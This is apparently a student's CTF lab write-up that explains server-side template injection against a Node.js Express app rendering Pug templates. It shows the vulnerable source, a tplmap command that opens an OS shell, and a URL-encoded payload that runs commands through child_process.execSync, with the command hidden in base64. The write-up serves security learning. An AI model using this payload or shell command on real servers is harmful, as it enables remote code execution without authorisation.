---
title: Simple Web 0x22(Lab - Pug)
tags: [NTUSTWS, CTF, Web]

---

# Simple Web 0x22(Lab - Pug)
###### tags: `NTUSTWS` `CTF` `Web`
Challenge: http://h4ck3r.quest:8008

## Source code
:::spoiler
```javascript=
const express = require('express');
const pug = require('pug');

const app = express();

const template = `
h1 Hello %NAME%
form(method='GET' action='/')
  div
    label(for='nickname') Name:
    input#nickname(type='text', placeholder='Nickname' name='name')
    button(type='submit') Submit 
  a(href='/source') Source Code
`;

app.get('/', (req, res) => {
    const name = (req.query.name ?? 'Anonymous').toString();
    if (name.includes('{')) return res.send('Nice try');
    let html = pug.render(template.replace('%NAME%', name));
    res.set('Content-Type', 'text/html');
    res.send(html);
});

app.get("/source", (_, res) => {
    res.sendFile(__filename);
});

app.listen(3000, () => console.log(':3000'));

```
:::
## Exploit - `tqlmap`
```bash!
$ ./tplmap.py --engine pug --os-shell -u "http://h4ck3r.quest:8008/?name=bob"
```

* Using wireshark to trace the payload
You must let the template by like:
    ```javascript!
    const template = `
    h1 Hello %NAME%
    = global.process.mainModule.require('child_process').execSync(Buffer('bHM=', 'base64').toString())
    form(method='GET' action='/')
      div
        label(for='nickname') Name:
        input#nickname(type='text', placeholder='Nickname' name='name')
        button(type='submit') Submit 
      a(href='/source') Source Code
    `;
    ```
    Including a new line and an equal sign
    Payload:
    `%0A%3D%20global.process.mainModule.require%28%27child_process%27%29.execSync%28Buffer%28%27bHM%3D%27%2C%2B%27base64%27%29.toString%28%29%29`
    which is
    ```

    = global.process.mainModule.require('child_process').execSync(Buffer('bHM=',+'base64').toString())
    ```
* Note that `bHM=` is command `ls` in base64 format
## Reference
[关于SSTI注入的二三事](https://xz.aliyun.com/t/11090)
[【SSTI模块注入】SSTI+Flask+Python（下）：绕过过滤](https://blog.51cto.com/u_15414689/5530904)
[0xdbe-appsec/ssti-express-pug](https://github.com/0xdbe-appsec/ssti-express-pug)
[Tplmap](https://github.com/epinna/tplmap/blob/master/README.md)
[[Linux系統] Ubuntu 安裝 Node.js](https://andy6804tw.github.io/2019/09/23/ubuntu-indtall-nodejs/)